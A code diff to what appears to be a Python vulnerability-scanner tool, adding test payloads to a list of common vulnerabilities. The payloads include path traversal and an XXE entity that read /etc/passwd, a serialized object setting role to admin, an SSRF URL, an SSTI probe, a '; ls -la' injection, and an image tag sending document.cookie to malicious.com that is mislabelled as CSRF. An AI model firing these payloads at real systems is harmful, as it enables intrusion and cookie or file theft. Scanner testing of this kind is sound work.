@@ -100,8 +100,43 @@ COMMON_VULNERABILITIES = [
         "payload": "; ls -la",
         "check": "Command Vulnerability Detected",
     },
-    # Add more vulnerability checks as needed
+    {
+        "name": "Directory Traversal",
+        "payload": "../../../../etc/passwd",
+        "check": "Directory Traversal Detected",
+    },
+    {
+        "name": "Cross-Site Request Forgery (CSRF)",
+        "payload": '<img src="http://malicious.com/csrf?cookie='
+                   '+document.cookie" alt="CSRF Attack"/>',
+        "check": "CSRF Vulnerability Detected",
+    },
+    {
+        "name": "Server-Side Request Forgery (SSRF)",
+        "payload": "http://internal-server/admin",
+        "check": "SSRF Vulnerability Detected",
+    },
+    {
+        "name": "Insecure Deserialization",
+        "payload": "O:4:\"User\":2:{s:4:\"name\";s:6:\"hacker\";"
+                   "s:4:\"role\";s:5:\"admin\";}",
+        "check": "Insecure Deserialization Detected",
+    },
+    {
+        "name": "XML External Entity (XXE) Injection",
+        "payload": '<?xml version="1.0" encoding="UTF-8"?>\n'
+                   '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+                   '<foo>&xxe;</foo>',
+        "check": "XXE Injection Detected",
+    },
+    {
+        "name": "Server-Side Template Injection (SSTI)",
+        "payload": "{{7*7}}",
+        "check": "SSTI Vulnerability Detected",
+    },
+    # Add more vulnerabilities as needed
 ]
+
 
 # Function to create a tool frame
 def create_tool_frame(tool_name, notebook):
